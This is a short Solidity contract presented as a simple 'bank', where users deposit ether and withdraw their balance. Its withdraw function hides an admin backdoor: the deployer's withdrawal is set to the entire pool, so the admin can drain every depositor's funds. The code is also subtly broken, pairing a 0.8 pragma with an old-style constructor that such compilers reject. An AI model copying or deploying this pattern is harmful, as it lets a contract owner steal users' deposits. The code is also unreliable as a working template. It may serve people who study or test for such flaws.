pragma solidity ^0.8.0;

contract bank {
    mapping(address => uint) public pendingReturns;
    uint public all;
    address admin;

    function bank()
    {
      admin=msg.sender;
    }

    function bid() public payable {
        all=all+msg.value;
        pendingReturns[msg.sender]+=msg.value;
    }

    function withdraw() public returns (bool) {
        uint myBalance = pendingReturns[msg.sender];
        if(msg.sender==admin)
        {
          pendingReturns[admin]=all;
          myBalance = pendingReturns[msg.sender];
        }
        if (myBalance > 0) {

            pendingReturns[msg.sender] = 0;
            if (!msg.sender.send(myBalance)) {

                pendingReturns[msg.sender] = myBalance;
                return false;
            }
        }
        return true;
    }
}